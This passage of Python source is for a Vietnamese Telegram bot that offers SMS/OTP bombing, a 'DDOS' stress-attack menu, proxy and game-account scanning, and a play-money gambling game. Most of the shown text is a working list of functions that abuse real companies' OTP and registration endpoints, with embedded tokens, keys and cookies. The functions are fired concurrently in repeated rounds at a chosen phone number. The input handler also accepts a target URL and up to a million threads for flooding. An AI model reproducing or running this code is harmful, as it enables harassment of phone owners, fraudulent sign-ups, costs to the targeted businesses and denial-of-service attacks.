                  headers={'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','origin':'https://www.cathaylife.com.vn','referer':'https://www.cathaylife.com.vn/CPWeb/html/CP/Z1/CPZ1_0100/CPZ10110.html'},
                  data={'memberMap':f'{{"userName":"rancellramseyis792@gmail.com","password":"traveLo@a123","birthday":"03/07/2001","certificateNumber":"034202008372","phone":"{sdt}","email":"rancellramseyis792@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Nguyễn Quang Ngọc"}}','OTP_TYPE':'P','LANGS':'vi_VN'})

def send_otp_via_dominos(sdt):
    try:
        requests.post('https://dominos.vn/api/v1/users/send-otp',
                      headers={'content-type':'application/json','dmn':'DSNKFN','secret':'bPG0upAJLk0gz/2W1baS2Q==','origin':'https://dominos.vn','referer':'https://dominos.vn/'},
                      json={'phone_number':sdt,'email':'rancellramseyis792@gmail.com','type':0,'is_register':True})
    except:
        pass

def send_otp_via_vinamilk(sdt):
    requests.post('https://new.vinamilk.com.vn/api/account/getotp',
                  headers={'authorization':'Bearer null','content-type':'text/plain;charset=UTF-8','origin':'https://new.vinamilk.com.vn','referer':'https://new.vinamilk.com.vn/account/register'},
                  data=f'{{"type":"register","phone":"{sdt}"}}')

def send_otp_via_vietloan2(sdt):
    requests.post('https://vietloan.vn/register/phone-resend',
                  cookies={'_fbp':'fb.1.1720102725444...','XSRF-TOKEN':'eyJpdiI6...','sessionid':'eyJpdiI6...'},
                  headers={'content-type':'application/x-www-form-urlencoded; charset=UTF-8','x-requested-with':'XMLHttpRequest','origin':'https://vietloan.vn','referer':'https://vietloan.vn/register'},
                  data={'phone':sdt,'_token':'0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU'})

def send_otp_via_batdongsan(sdt):
    requests.get('https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
                 params={'phoneNumber':sdt},
                 headers={'accept':'application/json, text/plain, */*','referer':'https://batdongsan.com.vn/sellernet/internal-sign-up','origin':'https://batdongsan.com.vn'})

def send_otp_via_GUMAC(sdt):
    requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number',
                  headers={'Content-Type':'application/json','origin':'https://gumac.vn','referer':'https://gumac.vn/'},
                  json={'phone':sdt})

def send_otp_via_mutosi(sdt):
    requests.post('https://api-omni.mutosi.com/client/auth/register',
                  headers={'Authorization':'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b','Content-Type':'application/json','origin':'https://mutosi.com','referer':'https://mutosi.com/'},
                  json={'name':'hà khải','phone':sdt,'password':'Vjyy1234@','confirm_password':'Vjyy1234@','verify_otp':0,'store_token':'226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b','email':'dđ@gmail.com','birthday':'2006-02-13','accept_the_terms':1,'receive_promotion':1})

def send_otp_via_mutosi1(sdt):
    requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone',
                  headers={'Authorization':'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b','Content-Type':'application/json','origin':'https://mutosi.com','referer':'https://mutosi.com/'},
                  json={'phone':sdt,'token':'03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_...','source':'web_consumers'})

def send_otp_via_vietair(sdt):
    requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx',
                  cookies={'_gcl_au':'1.1.515899722.1720625176','_gid':'GA1.3.1511312052.1721112193','_ga':'GA1.1.186819165.1720625180'},
                  headers={'content-type':'application/x-www-form-urlencoded; charset=UTF-8','x-requested-with':'XMLHttpRequest','origin':'https://vietair.com.vn','referer':f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile={sdt}'},
                  data={'op':'PACKAGE_HTTP_POST','path_ajax_post':'/service03/sms/get','package_name':'PK_FD_SMS_OTP','object_name':'INS','P_MOBILE':sdt,'P_TYPE_ACTIVE_CODE':'DANG_KY_NHAN_OTP'})

def send_otp_via_FAHASA(sdt):
    requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone',
                  cookies={'frontend':'173c6828799e499e81cd64a949e2c73a','frontend_cid':'7bCDwdDzwf8wpQKE'},
                  headers={'content-type':'application/x-www-form-urlencoded; charset=UTF-8','x-requested-with':'XMLHttpRequest','origin':'https://www.fahasa.com','referer':'https://www.fahasa.com/customer/account/login/referer/...'},
                  data={'phone':sdt})

def send_otp_via_hopiness(sdt):
    requests.post('https://shopiness.vn/ajax/user',
                  headers={'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','origin':'https://shopiness.vn','referer':'https://shopiness.vn/'},
                  data={'action':'verify-registration-info','phoneNumber':sdt,'refCode':''})

def send_otp_via_modcha35(sdt):
    requests.post('https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32',
                  headers={'User-Agent':'mocha/1.28','Content-Type':'application/x-www-form-urlencoded','APPNAME':'MC35'},
                  data=f"clientType=ios&countryCode=VN&device=iPhone15%2C3&os_version=iOS_17.0.2&platform=ios&revision=11224&username={sdt}&version=1.28")

def send_otp_via_Bibabo(sdt):
    requests.get('https://one.bibabo.vn/api/v1/login/otp/createOtp',
                 params={'phone':sdt,'reCaptchaToken':'undefined','appId':'7','version':'2'},
                 headers={'User-Agent':'bibabo/522','Accept':'application/json, text/plain, */*','accept-language':'vi-VN,vi;q=0.9'})

def send_otp_via_MOCA(sdt):
    requests.get('https://moca.vn/moca/v2/users/role',
                 params={'phoneNumber':sdt},
                 headers={'User-Agent':'Pass/2.10.156','digest':'SHA-256=cgvOMMsYWgehDVly4KtMMT3F10WQDyMiQT05/hL5YhE=','device-id':'b51fb1bf16bd391f0b22e68ebf9efb3966acecfc0d587a91031b504754e312f1','platform':'P_IOS-2.10.156','x-request-id':'4ADAF544-AB6D-4B7F-985A-BF6DAEAA38EA1722518105.413269','pre-authorization':'hmac username="06b707de-6050-11eb-ae93-0242ac130002", algorithm="hmac-sha256", headers="date digest", signature="cZevTUC0yW+WSAVer9McsgpV79XoaL+BTnocoHuzBjw="'})

def send_otp_via_pantio(sdt):
    requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate',
                  params={'domain':'pantiofashion.myharavan.com'},
                  headers={'content-type':'application/x-www-form-urlencoded; charset=UTF-8','origin':'https://pantio.vn','referer':'https://pantio.vn/'},
                  data={'phoneNumber':sdt})

def send_otp_via_Routine(sdt):
    requests.post('https://routine.vn/customer/otp/send/',
                  headers={'content-type':'application/x-www-form-urlencoded; charset=UTF-8','x-requested-with':'XMLHttpRequest','origin':'https://routine.vn','referer':'https://routine.vn/'},
                  data={'telephone':sdt,'isForgotPassword':'0'})

def send_otp_via_vayvnd(sdt):
    requests.post('https://api.vayvnd.vn/v2/users', json={'phone':sdt,'utm':[{'utm_source':'leadbit','utm_medium':'cpa'}],'cpaId':2,'sourceSite':3,'regScreenResolution':{'width':1920,'height':1080},'trackingId':'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2'}, headers={'content-type':'application/json; charset=utf-8','origin':'https://vayvnd.vn','site-id':'3'})
    requests.post('https://api.vayvnd.vn/v2/users/password-reset', json={'login':sdt,'trackingId':'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2'}, headers={'content-type':'application/json; charset=utf-8','origin':'https://vayvnd.vn','site-id':'3'})

def send_otp_via_tima(sdt):
    requests.post('https://tima.vn/Borrower/RegisterLoanCreditFast',
                  cookies={'ASP.NET_SessionId':'m1ooydpmdnksdwkm4lkadk4p','UrlSourceTima_V3':'{"utm_campaign":null,"utm_medium":null,"utm_source":"www.bing.com","utm_content":null,"utm_term":null,"Referer":"www.bing.com"}','tkld':'b460087b-2c70-9d44-da8d-68d0d4c00f3a','tbllender':'tbllender'},
                  headers={'content-type':'application/x-www-form-urlencoded','origin':'https://tima.vn','referer':'https://tima.vn/vay-tien-online/'},
                  data={'application_full_name':rand_name(),'application_mobile_phone':sdt,'CityId':'1','DistrictId':'16','rules':'true','TypeTime':'1','application_amount':'0','application_term':'0','IsApply':'1','ProvinceName':'Thành phố Hà Nội','DistrictName':'Huyện Sóc Sơn','product_id':'2'})

def send_otp_via_moneygo(sdt):
    requests.post('https://moneygo.vn/dang-ki-vay-nhanh',
                  cookies={'XSRF-TOKEN':'eyJpdiI6IlJZYnY1ZHhEVmdBRXpIbXcza3A0N2c9PSIsInZhbHVlIjoiUEtCV09IdmFlVkZWQ1R3c2ZIT01seSthcVdaMFhDb2lVTkEybjVJZksrQnR4dmliSEFnWkp0dklONE5LMVZBOUQxNXpaVDNWbmdadExaQmt3Vy9ZVzdYL0JWR2lSSU91RG40ZDVybERZaWJEcnhBNWhBVHYzVHBQbjdVR0x2S0giLCJtYWMiOiJhOTBjMzExYzg3YjM1MjY2ZGIwODk0ZThlNWFkYzEwNGMyYzc2ZmFmMmRlYzNkOTExNDM3M2E5ZjFmYWEzNjA1In0%3D','laravel_session':'eyJpdiI6IlpHaDc2cGgyc0g4akhrdHFkT0tic1E9PSIsInZhbHVlIjoiSjYxQWZ4VlA0UmFwVDVGdkE2TzQ2OU1PSDhJQlR3MVBlbzdKV3g3a3czcStucGpIbTJIRnVpR0l3ZVR3clJsWUxjSlFMRUFuK3NhQ2VKVC9hc2Q5QlJYZEhpRVdNa0xlV21XcFgrelpoQTBhSUdlNngvR0NSRVdzUEFJcXhPNXUiLCJtYWMiOiIxYmM4NDBkN2VhMTVhZTJhOGU5MzFlOTUwNDc4NzFhOTBhNzc1NTliZmE2MWM3MmUwNjZjNDAyMDg5OWZmODE4In0%3D'},
                  headers={'content-type':'application/x-www-form-urlencoded','origin':'https://moneygo.vn','referer':'https://moneygo.vn/'},
                  data={'_token':'X7pFLFlcnTEmsfjHE5kcPA1KQyhxf6qqL6uYtWCV','total':'56688000','phone':sdt,'agree':'1'})

def send_otp_via_pico(sdt):
    requests.post('https://auth.pico.vn/user/api/auth/register',
                  headers={'content-type':'application/json','origin':'https://pico.vn','referer':'https://pico.vn/','region-code':'MB'},
                  json={'name':rand_name(),'phone':sdt,'provinceCode':'92','districtCode':'925','wardCode':'31261','address':'123'})
    requests.post('https://auth.pico.vn/user/api/auth/login/request-otp',
                  headers={'content-type':'application/json','access':'206f5b6838b4e357e98bf68dbb8cdea5','channel':'b2c','party':'ecom','platform':'Desktop','origin':'https://pico.vn','referer':'https://pico.vn/','uuid':'cc31d0b5815a483b92f547ab8438da53'},
                  json={'phone':sdt})

def send_otp_via_PNJ(sdt):
    requests.post('https://www.pnj.com.vn/customer/otp/request',
                  cookies={'XSRF-TOKEN':'eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D','mypnj_session':'eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D'},
                  headers={'content-type':'application/x-www-form-urlencoded','origin':'https://www.pnj.com.vn','referer':'https://www.pnj.com.vn/customer/login'},
                  data={'_method':'POST','_token':'0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU','type':'zns','phone':sdt})

def send_otp_via_TINIWORLD(sdt):
    requests.post('https://prod-tini-id.nkidworks.com/auth/tinizen',
                  cookies={'connect.sid':'s%3AH8p0CvGBaMDVy6Y2qO_m3DzTZqtnMCt4.Cq%2FVc%2FYiObV281zVYSUk7z7Zzq%2F5sxH877UXY2Lz9XU'},
                  headers={'content-type':'application/x-www-form-urlencoded','origin':'https://prod-tini-id.nkidworks.com','referer':'https://prod-tini-id.nkidworks.com/login?...'},
                  data={'_csrf':'','clientId':'609168b9f8d5275ea1e262d6','redirectUrl':'https://tiniworld.com','phone':sdt})

def send_otp_via_BACHHOAXANH(sdt):
    requests.post('https://apibhx.tgdd.vn/User/LoginWithPassword',
                  headers={'authorization':'Bearer 48AEFAE5FF6C90A31EBC7BB892756688','deviceid':'1c4323a6-32d4-4ce5-9081-b5a4655ba7e6','platform':'webnew','referer-url':'https://www.bachhoaxanh.com/dang-nhap','xapikey':'bhx-api-core-2022','origin':'https://www.bachhoaxanh.com','referer':'https://www.bachhoaxanh.com/dang-nhap'},
                  json={'deviceId':'1c4323a6-32d4-4ce5-9081-b5a4655ba7e6','userName':sdt,'isOnlySms':1,'ip':''})

def send_otp_via_shbfinance(sdt):
    requests.post('https://customer-app-nred.shbfinance.com.vn/api/web/SubmitLoan',
                  headers={'Authorization':'Bearer','Content-Type':'application/json','origin':'https://www.shbfinance.com.vn','referer':'https://www.shbfinance.com.vn/'},
                  json={'customerName':rand_name(),'mobileNumber':sdt,'campaignCode':'','documentIds':'Cash','year':1996,'provinceName':'An Giang','districtName':'Châu Đốc','document':'Vay tiền mặt','lendingAmt':40000000,'loanAmt':40000000,'lendingPeriod':12,'dateOfBirth':'01-Jan-1996','partnerName':'Website','utmSource':'WEB','utmMedium':'form','utmCampaign':'vay-tien-mat'})

def send_otp_via_mafccomvn(sdt):
    requests.post('https://mafc.com.vn/wp-content/themes/vixus/vaytiennhanhnew/api.php',
                  cookies={'pll_language':'vi','BIGipServerPool_www.mafc.com.vn':'654334730.20480.0000','MAFC01f6952f':'018fd3cf...'},
                  headers={'content-type':'application/json','origin':'https://mafc.com.vn','referer':'https://mafc.com.vn/vay-tien-nhanh','user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15'},
                  json={'usersName':'tannguyen','password':'mafc123!','phoneNbr':sdt,'name':rand_name(),'nationalId':'034201009872','typeCreate':'API','age':'1992','vendorCode':'INTERNAL_MKT','msgName':'creatlead'})

def send_otp_via_phuclong(sdt):
    requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/check',
                  headers={'authorization':'Bearer undefined','content-type':'application/json','x-api-key':'bca14340890a65e5adb04b6fd00a75f264cf5f57e693641f9100aefc642461d3','origin':'https://order.phuclong.com.vn','referer':'https://order.phuclong.com.vn/'},
                  json={'userName':sdt})
    requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register',
                  headers={'authorization':'Bearer undefined','content-type':'application/json','x-api-key':'bca14340890a65e5adb04b6fd00a75f264cf5f57e693641f9100aefc642461d3','origin':'https://order.phuclong.com.vn','referer':'https://order.phuclong.com.vn/'},
                  json={'phoneNumber':sdt,'fullName':rand_name(),'email':'th456do1g110@hotmail.com','password':'Nqnt7%@hf3'})

def send_otp_via_takomo(sdt):
    requests.post('https://lk.takomo.vn/api/4/client/otp/send',
                  cookies={'__sbref':'mkmvwcnohbkannbumnilmdikhgdagdlaumjfsexo','_cabinet_key':'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM5NTI3MTQwMg._Opxk3aYQEWoonHoIgUhbhOxUx_9BtdySPUqwzWA9C0'},
                  headers={'content-type':'application/json;charset=UTF-8','origin':'https://lk.takomo.vn','referer':f'https://lk.takomo.vn/?phone={sdt}&amount=2000000&term=7&utm_source=pop_up&utm_medium=organic&utm_campaign=direct_takomo&utm_content=mainpage_popup_login'},
                  json={'data':{'phone':sdt,'code':'resend','channel':'ivr'}})

# ==================== DANH SÁCH HÀM ====================
all_otp_funcs = [
    send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
    send_otp_via_dienmayxanh, send_otp_via_kingfoodmart, send_otp_via_mocha, send_otp_via_fptdk,
    send_otp_via_fptmk, send_otp_via_VIEON, send_otp_via_ghn, send_otp_via_lottemart,
    send_otp_via_DONGCRE, send_otp_via_shopee, send_otp_via_TGDD, send_otp_via_fptshop,
    send_otp_via_WinMart, send_otp_via_vietloan, send_otp_via_lozi, send_otp_via_F88,
    send_otp_via_spacet, send_otp_via_vinpearl, send_otp_via_traveloka, send_otp_via_dongplus,
    send_otp_via_longchau, send_otp_via_longchau1, send_otp_via_galaxyplay, send_otp_via_emartmall,
    send_otp_via_ahamove, send_otp_via_ViettelMoney, send_otp_via_xanhsmsms, send_otp_via_xanhsmzalo,
    send_otp_via_popeyes, send_otp_via_ACHECKIN, send_otp_via_APPOTA, send_otp_via_Watsons,
    send_otp_via_hoangphuc, send_otp_via_fmcomvn, send_otp_via_Reebokvn, send_otp_via_thefaceshop,
    send_otp_via_BEAUTYBOX, send_otp_via_winmart, send_otp_via_futabus, send_otp_via_ViettelPost,
    send_otp_via_myviettel2, send_otp_via_myviettel3, send_otp_via_TOKYOLIFE, send_otp_via_30shine,
    send_otp_via_Cathaylife, send_otp_via_dominos, send_otp_via_vinamilk, send_otp_via_vietloan2,
    send_otp_via_batdongsan, send_otp_via_GUMAC, send_otp_via_mutosi, send_otp_via_mutosi1,
    send_otp_via_vietair, send_otp_via_FAHASA, send_otp_via_hopiness, send_otp_via_modcha35,
    send_otp_via_Bibabo, send_otp_via_MOCA, send_otp_via_pantio, send_otp_via_Routine,
    send_otp_via_vayvnd, send_otp_via_tima, send_otp_via_moneygo, send_otp_via_takomo,
    send_otp_via_pico, send_otp_via_PNJ, send_otp_via_TINIWORLD, send_otp_via_BACHHOAXANH,
    send_otp_via_shbfinance, send_otp_via_mafccomvn, send_otp_via_phuclong
]
  # THAY THẾ BẰNG MẢNG 76 HÀM TỪ FILE 3.py

spam_tasks = {}
async def spam_worker(chat_id, phone, count, context):
    ev = threading.Event(); spam_tasks[chat_id] = ev
    for i in range(1, count + 1):
        if ev.is_set(): break
        await context.bot.send_message(chat_id, f"🔄 Đợt {i}/{count}...")
        loop = asyncio.get_running_loop()
        def run_all():
            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as pool:
                list(pool.map(lambda f: f(phone), all_otp_funcs))
        await loop.run_in_executor(None, run_all)
        await asyncio.sleep(4)
    if not ev.is_set(): await context.bot.send_message(chat_id, "✅ Hoàn thành spam!")
    spam_tasks.pop(chat_id, None)

def spam_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📱 Nhập SĐT & số lần", callback_data="spam_input")],
        [InlineKeyboardButton("🛑 Dừng spam", callback_data="spam_stop")]
    ])
# ==================== BANK / VND ====================
async def cmd_bank(update, context):
    uid = update.effective_user.id
    if not check_antispam(uid) or is_blacklisted(uid): return
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    if not is_bot_enabled() and not is_owner(uid): await update.message.reply_text("⚠️ Bot đang tạm dừng."); return
    if len(context.args) < 2: await update.message.reply_text("/bank <id/@username> <số tiền>"); return
    target = context.args[0]; amt_str = context.args[1]
    try: amount = parse_money(amt_str)
    except: await update.message.reply_text("Số tiền không hợp lệ."); return
    if amount <= 0: await update.message.reply_text(">0."); return
    sender = get_user_game_data(uid)
    if sender["balance"] < amount: await update.message.reply_text(f"❌ Không đủ. Số dư: {format_money(sender['balance'])}"); return
    receiver_id = None
    try: receiver_id = int(target)
    except:
        uname = target.lstrip("@").lower()
        for k,v in user_data_store.items():
            if k in ("owner","blacklist","bot_enabled"): continue
            if v.get("profile",{}).get("username","").lower() == uname: receiver_id = int(k); break
    if not receiver_id: await update.message.reply_text("❌ Không tìm thấy người nhận."); return
    if receiver_id == uid: await update.message.reply_text("❌ Không thể tự chuyển."); return
    recv = get_user_game_data(receiver_id)
    sender["balance"] -= amount; recv["balance"] += amount; save_all_data()
    try: await context.bot.send_message(receiver_id, f"💰 Nhận {format_money(amount)} từ {uid}. Số dư: {format_money(recv['balance'])}")
    except: pass
    await update.message.reply_text(f"✅ Đã chuyển {format_money(amount)} đến {target}.")

async def cmd_vnd(update, context):
    uid = update.effective_user.id
    if not is_owner(uid): await update.message.reply_text("❌ Không có quyền."); return
    if len(context.args) < 2: await update.message.reply_text("/vnd <id/@username> <số>"); return
    target = context.args[0]; amt_str = context.args[1]
    try: amount = parse_money(amt_str)
    except: await update.message.reply_text("Số không hợp lệ."); return
    if amount <= 0: await update.message.reply_text(">0."); return
    receiver_id = None
    try: receiver_id = int(target)
    except:
        uname = target.lstrip("@").lower()
        for k,v in user_data_store.items():
            if k in ("owner","blacklist","bot_enabled"): continue
            if v.get("profile",{}).get("username","").lower() == uname: receiver_id = int(k); break
    if not receiver_id: await update.message.reply_text("❌ Không tìm thấy."); return
    recv = get_user_game_data(receiver_id); recv["balance"] += amount; save_all_data()
    try: await context.bot.send_message(receiver_id, f"🎁 Chủ bot tặng {format_money(amount)}. Số dư: {format_money(recv['balance'])}")
    except: pass
    await update.message.reply_text(f"✅ Đã tặng {format_money(amount)} cho {target}.")

# ==================== STOPBOT / STARTBOT ====================
async def stop_all_tasks():
    # Dừng tất cả proxy tasks
    for uid, rt in user_runtime.items():
        if rt.get("proxy_task") and not rt["proxy_task"].done():
            rt["proxy_stop_event"].set()
            rt["proxy_task"].cancel()
        if rt.get("monitoring"):
            rt["monitoring"] = False
            if rt.get("monitor_task"):
                rt["monitor_task"].cancel()
        # Reset runtime
        rt["proxy_task"] = None
        rt["proxy_msg"] = None
        rt["proxy_stop_event"] = None
        rt["monitor_task"] = None
    # Dừng các tác vụ scan LQ
    for chat_id, ev in scan_lq_tasks.items():
        ev.set()
    scan_lq_tasks.clear()
    # Dừng spam
    for chat_id, ev in spam_tasks.items():
        ev.set()
    spam_tasks.clear()
    # Dừng DDOS
    for chat_id, ev in stress_tasks.items():
        ev.set()
    stress_tasks.clear()
    for k in user_data_store:
        if k in ("owner","blacklist","bot_enabled"): continue
        try: await context.bot.send_message(int(k), "⚠️ Bot đã tắt.")
        except: pass
    await update.message.reply_text("✅ Bot đã dừng.")

async def cmd_startbot(update, context):
    if not is_owner(update.effective_user.id): return
    user_data_store["bot_enabled"] = True; save_all_data()
    for k in user_data_store:
        if k in ("owner","blacklist","bot_enabled"): continue
        try: await context.bot.send_message(int(k), "✅ Bot đã bật lại.")
        except: pass
    await update.message.reply_text("✅ Bot đã bật lại.")

# ==================== TOP ====================
async def cmd_top(update, context):
    uid = update.effective_user.id
    if not check_antispam(uid): return
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    today = date.today().isoformat()
    last_reset = user_data_store.get("top_reset_date","2000-01-01")
    try:
        last = date.fromisoformat(last_reset)
        if (date.today() - last).days >= 7:
            users = []
            for uid_str, data in user_data_store.items():
                if uid_str in ("owner","blacklist","bot_enabled","top_reset_date"): continue
                try:
                    u = int(uid_str); bal = data.get("game",{}).get("balance",0)
                    users.append((u, bal))
                except: pass
            users.sort(key=lambda x: x[1], reverse=True)
            top_old = users[:3]
            rewards = {1: 2_000_000_000, 2: 1_000_000_000, 3: 500_000_000}
            for i, (u, bal) in enumerate(top_old, start=1):
                game = get_user_game_data(u); game["balance"] += rewards.get(i,0)
            for uid_str, data in user_data_store.items():
                if uid_str in ("owner","blacklist","bot_enabled","top_reset_date"): continue
                game = data.get("game")
                if game: game["balance"] = 0
            user_data_store["top_reset_date"] = today
            await update.message.reply_text("🔄 Đã reset bảng xếp hạng và trao thưởng top 3 tuần trước!")
            save_all_data()
    except: pass
    users = []
    for uid_str, data in user_data_store.items():
        if uid_str in ("owner","blacklist","bot_enabled","top_reset_date"): continue
        try:
            u = int(uid_str); bal = data.get("game",{}).get("balance",0)
            users.append((u, bal))
        except: pass
    users.sort(key=lambda x: x[1], reverse=True)
    top20 = users[:20]
    text_lines = ["🏆 *Top 20 giàu nhất:*\n"]
    for i, (u, bal) in enumerate(top20, start=1):
        profile = user_data_store.get(str(u),{}).get("profile",{})
        uname = profile.get("username", str(u))
        text_lines.append(f"{i}. `{uname}` - {format_money(bal)}")
    if not top20: text_lines.append("Chưa có ai.")
    await update.message.reply_text("\n".join(text_lines), parse_mode="Markdown")

# ==================== CALLBACK HANDLER ====================
async def button_callback(update, context):
    query = update.callback_query; await query.answer()
    uid = update.effective_user.id; update_user_profile(uid, update)
    if not is_owner(uid) and not check_user_key(uid):
        await query.edit_message_text("🔑 Bạn cần key để dùng bot. Hãy /start để nhập key.")
        return
    if not is_bot_enabled() and not is_owner(uid): await query.edit_message_text("⚠️ Bot đang tạm dừng."); return
    if not check_antispam(uid): return
    data = query.data; rt = get_user_runtime(uid)

    if data == "main_menu": await query.edit_message_text("🏠 Menu", reply_markup=main_menu_keyboard())
    elif data == "menu_proxy": await query.edit_message_text("🌐 Proxy", reply_markup=proxy_menu_keyboard())
    elif data == "menu_xworld": await query.edit_message_text("🎯 XWorld", reply_markup=xworld_menu_keyboard())
    elif data == "game_menu": mk,tx = game_menu_keyboard(uid); await query.edit_message_text(tx, parse_mode='Markdown', reply_markup=mk)
    elif data == "menu_ddos": await query.edit_message_text("💣 DDOS", reply_markup=ddos_menu_keyboard())
    elif data == "menu_scanlq": await query.edit_message_text("🎮 Scan LQ", reply_markup=scan_lq_menu_keyboard())
    elif data == "menu_spam": await query.edit_message_text("📧 Spam SMS", reply_markup=spam_menu_keyboard())

    elif data == "ddos_start": await ddos_input_url(update, context)
    elif data == "ddos_stop":
        if uid in stress_tasks: stress_tasks[uid].set(); await query.edit_message_text("🛑 Đã dừng test.")
        else: await query.edit_message_text("ℹ️ Không có test.")

    elif data == "scanlq_quantity":
        context.user_data["expect_scanlq"] = "quantity"; await query.edit_message_text("Nhập số lượng (1-10):")
    elif data == "scanlq_infinite":
        if uid in scan_lq_tasks: await query.edit_message_text("⚠️ Đang scan, hãy dừng trước.")
        else:
            asyncio.create_task(scan_lq_infinite(update.effective_chat.id, context))
            await query.edit_message_text("♾️ Đã bắt đầu scan liên tục!")
    elif data == "scanlq_stop":
        if uid in scan_lq_tasks: scan_lq_tasks[uid].set(); await query.edit_message_text("🛑 Đã dừng.")
        else: await query.edit_message_text("ℹ️ Không có scan.")

    elif data == "spam_input":
        context.user_data["expect_spam"] = "phone"; await query.edit_message_text("Nhập SĐT (10 số, bắt đầu 0):")
    elif data == "spam_stop":
        if uid in spam_tasks: spam_tasks[uid].set(); await query.edit_message_text("🛑 Đã dừng spam.")
        else: await query.edit_message_text("ℹ️ Không có spam.")

    elif data.startswith("proxy_"):
        act = data[6:]
        if act == "stop_scan": await proxy_stop_scan(update, uid); await query.edit_message_text("🛑 Đã dừng quét.")
        elif act in ("check_auto","check_long","start_scan"):
            if rt.get("proxy_task") and not rt["proxy_task"].done():
                await query.edit_message_text("⚠️ Scan proxy đang chạy."); return
            if act == "check_auto": await run_proxy_check(update, context, False)
            elif act == "check_long": await run_proxy_check(update, context, True)
            elif act == "start_scan": await run_proxy_check(update, context, False)
            await query.edit_message_text("⏳ Đã bắt đầu...")
        elif act == "check_file":
            context.user_data["waiting_proxy_file"] = True; await query.edit_message_text("📎 Gửi file .txt.")

    elif data == "game_setbet": await game_setbet_prompt(update, context)
    elif data == "game_input_bet": await game_input_bet(update, context)
    elif data == "game_allin": await game_allin(update, context)
    elif data == "game_tai": await play_tai_xiu(update, context, "tai")
    elif data == "game_xiu": await play_tai_xiu(update, context, "xiu")

# ==================== TEXT HANDLER ====================
async def handle_text(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update)
    if context.user_data.get("expect_key"):
        await process_key_input(update, context); return
    if not is_owner(uid) and not check_user_key(uid):
        await request_key(update, context); return
    if not is_bot_enabled() and not is_owner(uid): await update.message.reply_text("⚠️ Bot đang tạm dừng."); return
    if not check_antispam(uid): return
    if is_blacklisted(uid): return
    txt = update.message.text.strip()

    if "expect_ddos" in context.user_data:
        state = context.user_data["expect_ddos"]
        if state == 'url':
            if not is_valid_url(txt): await update.message.reply_text("❌ URL không hợp lệ."); return
            context.user_data.pop("expect_ddos"); await ddos_input_threads(update, context, txt)
        elif state == 'threads':
            try: th = int(txt); assert 1 <= th <= 1000000
            except: await update.message.reply_text("❌ 1-1,000,000"); return
            context.user_data.pop("expect_ddos"); await ddos_input_duration(update, context, th)
        elif state == 'duration':
            try: dur = int(txt); assert 1 <= dur <= 60
            except: await update.message.reply_text("❌ 1-60"); return
            url = context.user_data.get("ddos_url"); th = context.user_data.get("ddos_threads")
            context.user_data.pop("expect_ddos",None); context.user_data.pop("ddos_url",None); context.user_data.pop("ddos_threads",None)
            await run_stress_test(update, context, update.effective_chat.id, url, th, dur)
        return

    if "expect_scanlq" in context.user_data:
        try: qty = int(txt); assert 1 <= qty <= 10
        except: await update.message.reply_text("❌ 1-10"); return
        context.user_data.pop("expect_scanlq")
        asyncio.create_task(scan_lq_worker(update.effective_chat.id, qty, context))
        await update.message.reply_text(f"🚀 Bắt đầu scan {qty} tài khoản..."); return

    if "expect_spam" in context.user_data:
